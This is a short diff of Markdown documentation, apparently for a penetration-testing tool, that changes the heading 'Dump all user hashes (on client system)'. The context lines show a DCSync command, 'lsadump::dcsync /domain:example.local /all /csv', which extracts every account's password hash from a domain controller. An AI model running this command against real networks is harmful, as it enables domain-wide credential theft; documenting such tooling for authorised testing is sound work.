@@ -65,7 +65,7 @@ connection:
 
 ## Examples
 
-#### Dump all user hashes (on client system)
+### Dump all user hashes (on client system)
 
 ```plain
 lsadump::dcsync /domain:example.local /all /csv
